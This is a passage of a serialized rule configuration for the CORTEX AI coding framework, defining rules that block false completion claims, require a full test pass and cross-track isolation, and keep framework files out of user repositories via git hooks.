'converted', 'updated documentation', 'generated'], 'success_claim': ['success', 'completed successfully', 'fixed \u2705', 'done \u2705']}, 'scope': ['description', 'log_output'], 'logic': 'AND'}, 'verification_required': [{'type': 'file_hash_comparison', 'description': 'Compare file hash before/after operation', 'requirement': 'Hashes MUST differ for transformation operations'}, {'type': 'git_diff_check', 'description': 'Verify git diff shows actual changes', 'requirement': 'git diff MUST show modifications, not empty output'}, {'type': 'content_analysis', 'description': 'Validate transformation logic executed', 'requirement': 'Operation MUST NOT be pass-through (input != output)'}], 'alternatives': ['Implement actual transformation logic (not pass-through)', "Mark operation as 'validation-only' if no transformation needed", 'Add integration test verifying file changes occur', 'Change success message to reflect pass-through behavior'], 'evidence_template': "Operation '{operation_name}' claims transformation but produces no changes", 'rationale': 'SKULL-005: Transformation Verification\n\nReal incident (2025-11-10):\n- refresh_cortex_story operation executed\n- Module apply_narrator_voice_module.py claims "transformation complete"\n- Returns success=True with "Narrator voice transformation complete"\n- BUT: Line 123 does `context[\'transformed_story\'] = story_content` (pass-through!)\n- File hash unchanged after operation\n- git diff shows NO changes\n- User discovers operation is fake\n\nImpact:\n- User trust degradation (claims success but does nothing)\n- Status inflation (operations marked READY when incomplete)\n- Integration failures (downstream operations expect real data)\n\nSKULL-005 prevents this by:\n1. Detecting transformation + success claims in output\n2. Requiring file hash comparison test\n3. Blocking completion without measurable changes\n4. Forcing honest status reporting (PARTIAL vs READY)\n\nImplementation:\n- Add @verify_transformation decorator to operation modules\n- Integration tests MUST check before/after file state\n- CI fails if transformation claims success but git diff empty\n- Status documents distinguish architecture vs implementation\n'}, {'rule_id': 'SKULL_HEADER_FOOTER_IN_RESPONSE', 'name': 'Header/Footer in Copilot Response (SKULL-006)', 'severity': 'blocked', 'description': 'Operation orchestrators MUST include formatted headers/footers in Copilot Chat response', 'detection': {'combined_keywords': {'orchestrator_execution': ['execute operation', 'orchestrator.execute', 'operation complete'], 'missing_header_footer': ['formatted_header: None', 'formatted_footer: None', 'no header in response']}, 'scope': ['code', 'test_output'], 'logic': 'AND'}, 'verification_required': [{'type': 'result_object_check', 'description': 'Verify OperationResult contains formatted_header/footer', 'requirement': 'result.formatted_header MUST NOT be None'}, {'type': 'response_formatter_check', 'description': 'Verify ResponseFormatter uses stored headers', 'requirement': 'Chat response MUST include header/footer in code blocks'}, {'type': 'visual_inspection', 'description': 'Verify header appears in Copilot Chat window', 'requirement': 'User MUST see copyright header + purpose + accomplishments'}], 'alternatives': ['Use format_minimalist_header() and store in result.formatted_header', 'Use format_completion_footer() and store in result.formatted_footer', 'Ensure ResponseFormatter wraps headers in code blocks for display', 'Add integration test verifying header presence in formatted response'], 'evidence_template': "Operation '{operation_name}' executed but headers not in Copilot response\n\nExpected in Copilot Chat:\n```\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n  CORTEX {operation_name} Orchestrator v{version}\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\nProfile: {profile} \u2502 Mode: {mode} \u2502 Started: {timestamp}\n\n\U0001f4cb Purpose: {purpose}\n\n\xa9 2024-2025 Asif Hussain \u2502 Proprietary \u2502 github.com/asifhussain60/CORTEX\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n```\n\nActual: Header missing or only in terminal\n", 'rationale': 'SKULL-006: Header/Footer in Copilot Response\n\nReal incident (2025-11-11):\n- User: "why is header not being displayed?"\n- Headers printing to terminal (stdout) correctly\n- But GitHub Copilot Chat response had NO header\n- ResponseFormatter suppressing headers after first operation\n- User specified they want header "in the copilot response in the chat window"\n\nRoot Cause:\n1. Orchestrators print headers to stdout (terminal visibility)\n2. But stdout doesn\'t reach Copilot Chat window\n3. ResponseFormatter has _first_operation_shown flag (header suppression)\n4. User sees execution in terminal, but Chat response lacks context\n\nWhy This Matters:\n- Copyright attribution must be visible to user\n- Purpose/profile provides context for what operation did\n- Accomplishments show value delivered\n- Headers make operations feel professional and informative\n- Chat is primary interface (terminal is secondary)\n\nSolution:\n1. Orchestrators generate formatted headers/footers\n2. Store in OperationResult.formatted_header/footer\n3. ResponseFormatter checks for stored headers (priority)\n4. Wraps headers in code blocks for proper display\n5. Also prints to terminal for immediate visibility\n\nSKULL-006 enforces this by:\n- Requiring formatted_header/footer in OperationResult\n- Integration tests verify headers in formatted response\n- Blocking completion if headers missing from Chat output\n- Ensuring copyright/attribution always visible\n\nImplementation:\n```python\n# In orchestrator execute():\nformatted_header = format_minimalist_header(...)\nprint(formatted_header)  # Terminal visibility\n\n# ... operation logic ...\n\nformatted_footer = format_completion_footer(...)\nprint(formatted_footer)  # Terminal visibility\n\nreturn OperationResult(\n    success=True,\n    formatted_header=formatted_header,  # For Copilot Chat\n    formatted_footer=formatted_footer   # For Copilot Chat\n)\n```\n'}, {'rule_id': 'SKULL_ALL_TESTS_MUST_PASS', 'name': 'All Tests Must Pass (SKULL-007)', 'severity': 'blocked', 'description': 'Test suite MUST have 100% pass rate before claiming any work complete', 'detection': {'keywords': ['fixed \u2705', 'complete \u2705', 'done \u2705', 'implemented \u2705', 'ready for review', 'PR ready'], 'with_test_failures': ['failed', 'FAILED', 'ERROR', 'test failures', 'X passed, Y failed'], 'scope': ['response', 'test_output']}, 'verification_required': [{'type': 'full_test_suite', 'description': 'Run complete test suite (not just new tests)', 'requirement': 'pytest exit code MUST be 0 (100% pass rate)'}, {'type': 'no_skipped_critical_tests', 'description': 'Verify no critical tests are skipped', 'requirement': 'Core functionality tests MUST run (not skipped)'}, {'type': 'test_count_validation', 'description': "Ensure test count doesn't decrease unexpectedly", 'requirement': 'Total tests should increase or stay same (not decrease)'}], 'alternatives': ['Fix ALL failing tests before claiming completion', "Mark work as 'IN PROGRESS' until tests pass", 'Revert changes if they break existing tests', 'Fix pre-existing failures first (clean baseline)'], 'evidence_template': 'Work claimed complete but tests failing!\n\nTest Results: {test_summary}\n- Passed: {passed_count}\n- Failed: {failed_count}  \u274c\n- Skipped: {skipped_count}\n\nSKULL-007 VIOLATION: Cannot claim "done \u2705" with {failed_count} failures\n', 'rationale': 'SKULL-007: All Tests Must Pass\n\nReal incident (2025-11-11):\n- User: "are all tests passing?"\n- Agent: Ran tests, found 123 failed, 337 passed\n- Agent response: "No, not all tests are passing" (honest)\n- BUT: Agent claimed SKULL-006 work "complete \u2705" earlier\n- Pre-existing failures create false confidence\n\nWhy Pre-existing Failures Are Dangerous:\n1. Mask New Regressions:\n   - Can\'t tell if new code broke something\n   - "Already broken" becomes acceptable\n   - Technical debt accumulates silently\n\n2. Create False Confidence:\n   - "My tests pass" \u2260 "All tests pass"\n   - Incomplete validation of changes\n   - Integration issues hidden\n\n3. Compound Over Time:\n   - Each feature adds more failures\n   - "Just one more broken test" mentality\n   - Eventually unmaintainable\n\n4. Undermine Trust:\n   - Claims of completion ring hollow\n   - Quality standards erode\n   - Testing becomes performative\n\nExamples from Current Failures:\n- 123 failed tests (51% failure rate!)\n- Categories: Agent internals, platform issues, schema errors\n- Some tests testing wrong APIs (implementation changed)\n- Some tests have environmental dependencies\n- All must be fixed before claiming ANY work complete\n\nSKULL-007 Enforcement:\n1. BLOCKING severity - cannot proceed with failures\n2. Requires full test suite run (not just new tests)\n3. Exit code 0 mandatory (100% pass rate)\n4. No "works on my machine" exceptions\n5. No "will fix later" promises\n\nAllowed Exceptions:\n- Known flaky tests marked with @pytest.mark.flaky\n- Platform-specific tests properly skipped on other platforms\n- Optional feature tests when feature disabled in config\n\nNot Allowed:\n- "These failures are unrelated to my work"\n- "I\'ll fix them in next PR"\n- "Tests are broken, not my code"\n- "Only my new tests need to pass"\n\nImplementation Strategy:\n1. Fix critical blockers first (schema, imports)\n2. Fix by category (agents, ambient, tier1)\n3. Update tests if implementation changed\n4. Mark truly optional tests appropriately\n5. Achieve 100% pass rate\n6. Maintain 100% going forward\n\nThis is NOT optional. This is core quality engineering.\n'}, {'rule_id': 'SKULL_MULTI_TRACK_VALIDATION', 'name': 'Multi-Track Configuration Validation (SKULL-008)', 'severity': 'blocked', 'description': 'Multi-track mode MUST have valid configuration with proper phase distribution', 'detection': {'keywords': ['enable multi-track', 'activate multi-track', 'create tracks', 'split tracks', 'multi-machine mode'], 'scope': ['intent', 'description']}, 'verification_required': [{'type': 'track_balance_check', 'description': 'Verify workload balanced across tracks', 'requirement': 'Track estimated hours MUST not differ by >30%'}, {'type': 'dependency_isolation_check', 'description': 'Verify no cross-track dependencies', 'requirement': 'Phase groups MUST be self-contained per track'}, {'type': 'machine_assignment_check', 'description': 'Verify each machine assigned to exactly one track', 'requirement': 'No machine overlap, no unassigned machines'}, {'type': 'fun_name_uniqueness', 'description': 'Verify track names are unique and generated properly', 'requirement': 'Track names MUST be deterministic and collision-free'}], 'alternatives': ['Run track distribution algorithm to validate balance', 'Use PhaseDistributor.distribute() to check dependency isolation', 'Verify machine count matches track count', 'Test track name generation for collision resistance'], 'evidence_template': 'Multi-track mode validation failed!\n\nConfiguration Issues:\n- Track balance: {balance_check}\n- Dependencies: {dependency_check}\n- Machines: {machine_check}\n- Track names: {name_check}\n\nSKULL-008: Multi-track MUST be properly configured before use\n', 'rationale': 'SKULL-008: Multi-Track Configuration Validation\n\nMulti-track mode is powerful but requires careful setup:\n\n1. Workload Balance:\n   - Tracks with vastly different hours \u2192 bottlenecks\n   - One machine idle while other overloaded\n   - Race metrics meaningless if unfair\n   Example: Track A (10h) vs Track B (40h) = broken\n\n2. Dependency Isolation:\n   - Track A waiting on Track B output \u2192 blocked\n   - Cross-dependencies defeat parallel development\n   - Must group dependent phases on same track\n   Example: "setup" phases must complete before "processing"\n\n3. Machine Assignment:\n   - Machine assigned to multiple tracks \u2192 confusion\n   - Unassigned machines \u2192 wasted capacity\n   - Clear 1:1 or 1:N mapping required\n   Example: AHHOME on both tracks = which context?\n\n4. Track Name Uniqueness:\n   - Collision-resistant generation\n   - Deterministic (same input \u2192 same name)\n   - Human-memorable for commands\n   Example: Hash collision \u2192 wrong track loaded\n\nWhy This Matters:\n- Prevents split-mode failures mid-development\n- Ensures race metrics are meaningful\n- Maintains track isolation guarantees\n- Makes "continue implementation for [track]" reliable\n\nValidation Points:\n\nPre-Initialization:\n- Check machine count > 0\n- Verify operations.yaml accessible\n- Validate module definitions exist\n\nPost-Distribution:\n- Balance check: max_hours/min_hours < 1.3 (30% tolerance)\n- Dependency check: No phase in track requires other track\'s output\n- Machine check: Each machine in exactly one track\n- Name check: All track names unique and deterministic\n\nIntegration Test Required:\n```python\ndef test_multi_track_validation():\n    # Setup\n    machines = ["AHHOME", "Mac"]\n    config = create_multi_track_config(machines, modules)\n    \n    # Balance check\n    hours = [t.estimated_hours for t in config.tracks.values()]\n    assert max(hours) / min(hours) < 1.3, "Imbalanced tracks"\n    \n    # Dependency check\n    for track in config.tracks.values():\n        deps = get_phase_dependencies(track.phases)\n        assert all(d in track.phases for d in deps), "Cross-track dep"\n    \n    # Machine check\n    all_machines = [m for t in config.tracks.values() for m in t.machines]\n    assert len(all_machines) == len(set(all_machines)), "Duplicate machine"\n    \n    # Name check\n    names = [t.track_name for t in config.tracks.values()]\n    assert len(names) == len(set(names)), "Duplicate track name"\n```\n\nEnforcement:\n- CLI script validates before writing config\n- Design sync validates before split\n- Continue command validates track exists\n- Consolidation validates all tracks present\n'}, {'rule_id': 'SKULL_TRACK_ISOLATION', 'name': 'Track Work Isolation (SKULL-009)', 'severity': 'blocked', 'description': "Work on Track A MUST NOT modify Track B's assigned modules", 'detection': {'combined_keywords': {'track_context': ['continue implementation for', 'working on track', 'active track'], 'cross_modification': ['modified module', 'updated file', 'changed']}, 'scope': ['intent', 'log_output'], 'logic': 'AND'}, 'verification_required': [{'type': 'module_ownership_check', 'description': 'Verify modified modules belong to active track', 'requirement': "All changed files MUST be in active track's module list"}, {'type': 'phase_boundary_check', 'description': 'Verify work stays within assigned phases', 'requirement': "Modified files MUST belong to active track's phases"}, {'type': 'git_diff_validation', 'description': 'Verify git changes match track scope', 'requirement': 'git diff MUST only show files from active track'}], 'alternatives': ['Filter implementation state by active track', 'Validate module ownership before allowing changes', 'Add pre-commit hook checking track boundaries', 'Switch to correct track before making changes'], 'evidence_template': "Track isolation violation detected!\n\nActive Track: {active_track}\nModified Files: {modified_files}\nViolations: {violations}\n\nFiles belong to: {actual_track}\n\nSKULL-009: Tracks MUST NOT cross-modify each other's work\n", 'rationale': 'SKULL-009: Track Work Isolation\n\nCore principle: Each track is an isolated development context.\n\nWhy Isolation Matters:\n\n1. Prevents Merge Conflicts:\n   - Two machines editing same file \u2192 disaster\n   - Track A changes conflicting with Track B changes\n   - Consolidation becomes manual merge nightmare\n   Example: Both tracks fix same module differently\n\n2. Maintains Race Integrity:\n   - Track A can\'t "cheat" by doing Track B\'s work\n   - Progress metrics stay meaningful\n   - Velocity calculations remain accurate\n   Example: Track A does Track B\'s modules \u2192 unfair race\n\n3. Enables True Parallel Development:\n   - No coordination needed during work\n   - No "wait for Track A to finish" scenarios\n   - Maximum throughput achieved\n   Example: Both machines working simultaneously without blocking\n\n4. Simplifies Context Management:\n   - Each machine sees only relevant modules\n   - Copilot context smaller and focused\n   - Fewer tokens, faster responses\n   Example: Track A context excludes Track B\'s 50 modules\n\nEnforcement Mechanism:\n\n1. Pre-Modification Check:\n   ```python\n   def validate_module_ownership(module_id, active_track):\n       if module_id not in active_track.modules:\n           raise TrackIsolationError(\n               f"Module {module_id} belongs to different track"\n           )\n   ```\n\n2. Git Pre-Commit Hook:\n   ```bash\n   # Check if modified files belong to active track\n   active_track=$(get_active_track)\n   for file in $(git diff --cached --name-only); do\n       if ! track_owns_file "$active_track" "$file"; then\n           echo "Error: $file not in active track"\n           exit 1\n       fi\n   done\n   ```\n\n3. Design Sync Validation:\n   - Compare git log with track assignments\n   - Flag any cross-track modifications\n   - Require explicit override with justification\n\nAllowed Cross-Track Work:\n- Shared files (cortex.config.json)\n- Documentation updates (README.md)\n- Test fixtures (tests/fixtures/)\n\nNot Allowed:\n- Modifying other track\'s modules\n- Changing other track\'s phase files\n- Updating other track\'s status in design doc\n\nOverride Process:\nIf cross-track work truly needed:\n1. Document why isolation must break\n2. Get explicit user approval\n3. Log violation for consolidation review\n4. Merge carefully during consolidation\n\nIntegration Test:\n```python\ndef test_track_isolation():\n    # Setup two tracks\n    config = setup_multi_track([\'AHHOME\', \'Mac\'])\n    track_a = config.tracks[\'track_1\']\n    track_b = config.tracks[\'track_2\']\n    \n    # Simulate Track A trying to modify Track B\'s module\n    with pytest.raises(TrackIsolationError):\n        modify_module(track_b.modules[0], active_track=track_a)\n    \n    # Verify Track A can modify own modules\n    modify_module(track_a.modules[0], active_track=track_a)  # OK\n```\n'}, {'rule_id': 'SKULL_CONSOLIDATION_INTEGRITY', 'name': 'Track Consolidation Integrity (SKULL-010)', 'severity': 'blocked', 'description': 'Consolidation MUST merge all track progress accurately without data loss', 'detection': {'keywords': ['consolidate tracks', 'merge tracks', 'reset to single-track', 'design sync consolidation'], 'scope': ['intent', 'operation_name']}, 'verification_required': [{'type': 'progress_preservation_check', 'description': 'Verify no completed modules lost in merge', 'requirement': 'Consolidated count MUST equal sum of track counts'}, {'type': 'conflict_resolution_audit', 'description': 'Log all conflict resolutions with justification', 'requirement': 'Conflicts MUST be documented in archive'}, {'type': 'archive_completeness_check', 'description': 'Verify split docs archived before deletion', 'requirement': 'All split docs MUST exist in archive before removal'}, {'type': 'git_commit_validation', 'description': 'Verify consolidation tracked in git history', 'requirement': 'Git commit MUST reference both tracks and merge details'}], 'alternatives': ['Run consolidation with --verify flag', 'Review conflict resolution log before committing', 'Keep split docs until archive verified', 'Add integration test for consolidation accuracy'], 'evidence_template': 'Consolidation integrity check failed!\n\nPre-Consolidation:\n- Track A: {track_a_completed}/{track_a_total} modules\n- Track B: {track_b_completed}/{track_b_total} modules\n- Total: {pre_total_completed} modules\n\nPost-Consolidation:\n- Unified: {post_total_completed} modules\n\nDiscrepancy: {discrepancy} modules\nConflicts Resolved: {conflicts}\nArchive Status: {archive_status}\n\nSKULL-010: Consolidation MUST preserve all progress\n', 'rationale': 'SKULL-010: Track Consolidation Integrity\n\nConsolidation is the critical merge operation - must be perfect.\n\nWhat Can Go Wrong:\n\n1. Progress Loss:\n   - Track A shows module complete\n   - Consolidation misses it\n   - User loses work (demoralizing)\n   Example: Track A completed 15 modules, only 12 appear in merge\n\n2. Conflict Mishandling:\n   - Both tracks modified same module\n   - Wrong version selected\n   - Work overwritten silently\n   Example: Track A\'s fix lost, Track B\'s bug remains\n\n3. Archive Failure:\n   - Split docs deleted before archiving\n   - No way to audit merge decisions\n   - Can\'t roll back if issues found\n   Example: User wants to see what Track A had, archive empty\n\n4. Git History Gaps:\n   - Consolidation not committed properly\n   - Can\'t trace what was merged when\n   - Audit trail incomplete\n   Example: Merge happened, git log says nothing\n\nConsolidation Algorithm:\n\n```python\ndef consolidate_tracks(track_config, impl_state):\n    # Step 1: Collect all track progress\n    all_modules = {}\n    for track in track_config.tracks.values():\n        for module_id in track.modules:\n            status = get_module_status(module_id, impl_state)\n            \n            # Conflict detection\n            if module_id in all_modules:\n                conflict = resolve_conflict(\n                    all_modules[module_id],\n                    status,\n                    strategy=\'latest_timestamp\'\n                )\n                log_conflict_resolution(module_id, conflict)\n                all_modules[module_id] = conflict.winner\n            else:\n                all_modules[module_id] = status\n    \n    # Step 2: Validate counts\n    pre_count = sum(t.metrics.modules_completed for t in track_config.tracks.values())\n    post_count = sum(1 for s in all_modules.values() if s.completed)\n    \n    if pre_count != post_count:\n        raise ConsolidationError(\n            f"Progress mismatch: {pre_count} \u2192 {post_count}"\n        )\n    \n    # Step 3: Archive split docs\n    archive_dir = create_archive_directory()\n    for status_file in get_split_design_docs():\n        archive_file(status_file, archive_dir)\n    \n    # Step 4: Generate consolidated doc\n    consolidated = generate_consolidated_document(\n        all_modules,\n        track_config,\n        archive_reference=archive_dir\n    )\n    \n    # Step 5: Git commit with full details\n    commit_message = f"""design: consolidate multi-track progress\n    \n    Tracks merged:\n    - {track_config.tracks[\'track_1\'].track_name}: {track_config.tracks[\'track_1\'].metrics.completion_percentage}%\n    - {track_config.tracks[\'track_2\'].track_name}: {track_config.tracks[\'track_2\'].metrics.completion_percentage}%\n    \n    Total progress: {post_count}/{len(all_modules)} modules ({post_count/len(all_modules)*100:.0f}%)\n    Conflicts resolved: {len(get_conflicts())}\n    Archive: {archive_dir.name}\n    \n    [design_sync consolidation]\n    """\n    \n    git_commit(consolidated, commit_message)\n    \n    return consolidated\n```\n\nConflict Resolution Strategy:\n\nDefault: Latest Timestamp Wins\n- Simple, deterministic, predictable\n- Assumes most recent work is correct\n- Logged for audit\n\nExample:\n```\nModule: platform_detection\n- Track A: marked complete 2025-11-11 14:00\n- Track B: marked complete 2025-11-11 15:00\nWinner: Track B (later timestamp)\nLogged: conflict-resolution.yaml\n```\n\nArchive Structure:\n```\ncortex-brain/archived-tracks/20251111-164530/\n\u251c\u2500\u2500 CORTEX2-STATUS-SPLIT.MD       # Original split doc\n\u251c\u2500\u2500 track-1-history.jsonl         # Track A progress log\n\u251c\u2500\u2500 track-2-history.jsonl         # Track B progress log\n\u251c\u2500\u2500 conflicts-resolved.yaml       # Conflict resolution log\n\u2514\u2500\u2500 consolidation-report.md       # Summary of merge\n```\n\nIntegration Test:\n```python\ndef test_consolidation_integrity():\n    # Setup: Two tracks with overlapping work\n    config = create_multi_track([\'AHHOME\', \'Mac\'])\n    track_a_complete = mark_modules_complete(config.tracks[\'track_1\'], [0, 1, 2])\n    track_b_complete = mark_modules_complete(config.tracks[\'track_2\'], [3, 4, 5])\n    \n    # Introduce conflict: both complete module 2\n    mark_complete(config.tracks[\'track_1\'], \'module_2\', timestamp=\'14:00\')\n    mark_complete(config.tracks[\'track_2\'], \'module_2\', timestamp=\'15:00\')\n    \n    # Consolidate\n    consolidated = consolidate_tracks(config, impl_state)\n    \n    # Verify counts\n    assert consolidated.modules_completed == 6, "Progress lost"\n    \n    # Verify conflict handled\n    conflicts = get_conflict_log()\n    assert \'module_2\' in conflicts, "Conflict not logged"\n    assert conflicts[\'module_2\'][\'winner\'] == \'track_2\', "Wrong winner"\n    \n    # Verify archive\n    archive = get_latest_archive()\n    assert archive.exists(), "Archive missing"\n    assert (archive / \'CORTEX2-STATUS-SPLIT.MD\').exists(), "Split doc not archived"\n    \n    # Verify git\n    commit = get_latest_commit()\n    assert \'consolidate multi-track\' in commit.message\n    assert \'track_1\' in commit.message\n    assert \'track_2\' in commit.message\n```\n\nUser Experience:\n```\n$ /CORTEX design sync\n\n\U0001f3c1 Multi-Track Mode: Running design sync consolidation\n   Will merge all tracks into unified status\n\n[Phase 1/6] Discovering live implementation state...\n\u2705 Track A (Blazing Phoenix): 8/15 modules (53%)\n\u2705 Track B (Swift Falcon): 12/18 modules (67%)\n\n[Phase 5/6] Consolidating tracks...\n\u2699\ufe0f  Merging progress from 2 tracks...\n\u26a0\ufe0f  Conflict detected: platform_detection\n    Track A: complete @ 14:00\n    Track B: complete @ 15:00\n    Resolution: Track B wins (latest timestamp)\n\n\u2705 Consolidated 2 tracks into unified document\n   Combined: 20/33 modules (61%)\n   Conflicts resolved: 1 (logged)\n   Archive: cortex-brain/archived-tracks/20251111-164530/\n\n[Phase 6/6] Committing changes...\n\U0001f4be Git commit: 7a3b9c2 "design: consolidate multi-track progress"\n\nDesign Sync \u2705 COMPLETED in 4.2s\n   \u2022 Merged 2 tracks: Blazing Phoenix (53%) + Swift Falcon (67%)\n   \u2022 Combined progress: 20/33 modules (61%)\n   \u2022 Conflicts resolved: 1\n   \u2022 Archived split docs\n   \u2022 Reset to single-track mode\n```\n'}]}, {'layer_id': 'knowledge_quality', 'name': 'Knowledge Quality', 'description': 'Pattern validation and confidence thresholds', 'priority': 6, 'rules': [{'rule_id': 'MIN_OCCURRENCES', 'name': 'Minimum Occurrences for High Confidence', 'severity': 'warning', 'description': 'High confidence (>0.50) with single occurrence', 'detection': {'combined_keywords': {'high_confidence': ['confidence: 1.0', 'confidence=1.0', 'confidence: 0.95'], 'single_event': ['first occurrence', 'single event', 'occurrences: 1']}, 'scope': ['description'], 'logic': 'AND'}, 'alternatives': ['Start with confidence \u22640.50 for single event', 'Wait for 3+ occurrences before high confidence', 'Mark as provisional pattern'], 'evidence': 'Require 3+ occurrences for confidence >0.50'}, {'rule_id': 'PATTERN_VALIDATION', 'name': 'Pattern Validation', 'severity': 'warning', 'description': 'Pattern lacks validation evidence', 'detection': {'keywords': ['add pattern without validation', 'no evidence', 'unverified pattern'], 'scope': ['description']}, 'alternatives': ['Add validation test', 'Link to source documentation', 'Mark as hypothesis for validation'], 'evidence': 'Patterns require empirical validation'}]}, {'layer_id': 'commit_integrity', 'name': 'Commit Integrity', 'description': 'Brain state files excluded from commits', 'priority': 7, 'rules': [{'rule_id': 'BRAIN_STATE_GITIGNORE', 'name': 'Brain State Files Not Committed', 'severity': 'warning', 'description': 'Brain state file should not be committed', 'detection': {'files': '{{brain_state_files}}', 'keywords': ['commit'], 'scope': ['intent']}, 'alternatives': ['Add to .gitignore', 'Keep local-only', 'Export as snapshot if needed for sharing'], 'evidence': 'Add to .gitignore to prevent pollution'}, {'rule_id': 'TEMP_FILES_COMMIT', 'name': 'Temporary Files Not Committed', 'severity': 'warning', 'description': 'Temporary or generated files should not be committed', 'detection': {'path_patterns': ['**/*.tmp', '**/temp_*', '**/__pycache__/**', '**/node_modules/**'], 'keywords': ['commit'], 'scope': ['intent']}, 'alternatives': ['Update .gitignore', 'Clean before commit', 'Use .gitkeep for empty directories'], 'evidence': 'Temporary files pollute repository'}]}, {'layer_id': 'git_isolation', 'name': 'Git Isolation Enforcement', 'description': 'CORTEX code MUST NEVER be committed to user application repositories', 'priority': 8, 'rules': [{'rule_id': 'GIT_ISOLATION_ENFORCEMENT', 'name': 'CORTEX Code Isolation from User Repos', 'severity': 'blocked', 'description': 'CRITICAL: CORTEX source code, brain files, or internal components being committed to user application repository', 'detection': {'path_patterns': ['**/src/tier0/**', '**/src/tier1/**', '**/src/tier2/**', '**/src/tier3/**', '**/src/cortex_agents/**', '**/src/plugins/**', '**/src/crawlers/**', '**/cortex-brain/**', '**/prompts/**', '**/scripts/cortex/**', '**/CORTEX/**'], 'in_repo': 'user_application'}, 'alternatives': ['Keep CORTEX as separate repository/package', 'Install CORTEX via pip/npm (when distributed)', 'Use git submodule if local development required', 'Ensure .gitignore excludes CORTEX directories'], 'evidence_template': "\U0001f6a8 CRITICAL VIOLATION: Git Isolation Breach\n\nCORTEX code detected in user application repository!\nFile: '{path}'\n\nCORTEX MUST remain isolated from user application code:\n- User App Repo: Application-specific code only\n- CORTEX Repo: Framework code (separate repository)\n- Knowledge Sharing: Via exported YAML (team-knowledge/)\n\nBrain knowledge (cortex-brain/) is LOCAL ONLY - never committed anywhere.\n", 'rationale': 'GIT_ISOLATION_ENFORCEMENT: Core CORTEX Principle\n\nCORTEX operates as a SEPARATE cognitive layer:\n\n\u274c NEVER DO THIS:\nUserApp/\n\u251c\u2500\u2500 src/                    # User\'s application code\n\u251c\u2500\u2500 cortex-brain/           # \u274c WRONG - Don\'t commit brain!\n\u251c\u2500\u2500 src/tier0/              # \u274c WRONG - Don\'t copy CORTEX code!\n\u251c\u2500\u2500 src/cortex_agents/      # \u274c WRONG - Keep CORTEX separate!\n\u2514\u2500\u2500 .git/\n\n\u2705 CORRECT SETUP:\nUserApp/\n\u251c\u2500\u2500 src/                    # User\'s application code\n\u251c\u2500\u2500 team-knowledge/         # \u2705 OK - Exported YAML patterns\n\u251c\u2500\u2500 .gitignore              # \u2705 Must include: cortex-brain/\n\u2514\u2500\u2500 .git/\n\nCORTEX/ (separate repo)\n\u251c\u2500\u2500 src/tier0/              # \u2705 CORTEX framework code\n\u251c\u2500\u2500 src/cortex_agents/      # \u2705 Agent system\n\u251c\u2500\u2500 cortex-brain/           # \u2705 Local brain (not in git)\n\u2514\u2500\u2500 .git/\n\nWhy This Matters:\n1. Separation of Concerns: Framework vs. Application\n2. Licensing: CORTEX proprietary, user code their own license\n3. Updates: CORTEX updates don\'t pollute user repos\n4. Security: Brain knowledge stays local, never exposed\n5. Clarity: Clear boundary between "your code" and "framework"\n\nGit Hooks (setup during init):\n- pre-commit: Scans for CORTEX paths, blocks commit if found\n- pre-push: Double-check no CORTEX code being pushed\n\nException: team-knowledge/ YAML exports allowed (knowledge sharing)\n'}, {'rule_id': 'GIT_HOOKS_INSTALLATION', 'name': 'Git Hooks Must Be Installed During Setup', 'severity': 'blocked', 'description': 'Setup process must install git hooks to prevent accidental CORTEX code commits', 'detection': {'keywords': ['skip git hooks', 'disable hooks', 'bypass hook installation'], 'scope': ['intent', 'description']}, 'alternatives': ["Run 'cortex init' to install hooks automatically", 'Manually run setup script with hooks enabled', 'Never bypass hook installation (critical protection)'], 'evidence_template': 'Git hooks are MANDATORY for CORTEX isolation protection', 'rationale': "Git hooks provide automatic enforcement:\n\npre-commit hook:\n- Scans staged files for CORTEX paths\n- Blocks commit if any CORTEX code detected\n- Shows clear error message with alternatives\n\npre-push hook:\n- Final safety check before push\n- Prevents accidental exposure of CORTEX code\n\nInstallation: Automatic during 'cortex init'\nLocation: UserApp/.git/hooks/ (user's repo, not CORTEX repo)\n"}]}], 'severity_levels': {'safe': {'decision': 'ALLOW', 'override_required': False, 'message': '\u2705 Modification appears safe. No violations detected.'}, 'warning': {'decision': 'WARN', 'override_required': False, 'message': '\u26a0\ufe0f WARNING: Risky patterns detected. Proceed with caution.'}, 'blocked': {'decision': 'BLOCK', 'override_required': True, 'message': '\U0001f6e1\ufe0f BLOCKED: Critical architectural violations detected.'}}, 'challenge_template': "\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\U0001f9e0 BRAIN PROTECTION CHALLENGE\n\nTimestamp: {timestamp}\nSeverity: {severity}\nDecision: {decision}\n\n{message}\n\nSAFE ALTERNATIVES:\n{alternatives}\n\n\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\nOptions:\n  1. Accept recommended alternative (SAFE)\n  2. Provide different approach (REVIEW)\n  3. Type 'OVERRIDE' with justification (RISKY)\n\nYour choice:\n", 'logging': {'enabled': True, 'path': 'cortex-brain/corpus-callosum/protection-events.jsonl', 'format': 'jsonl', 'include_fields': ['timestamp', 'event', 'request', 'violations', 'decision', 'severity', 'alternatives_suggested', 'user_decision', 'override_justification', 'override_required']}, 'validation': [{'check': 'rules_complete', 'scope': 'protection_layers', 'required': True, 'params': {'all_layers_have_rules': True, 'all_rules_have_detection': True, 'all_rules_have_alternatives': True}}, {'check': 'severity_valid', 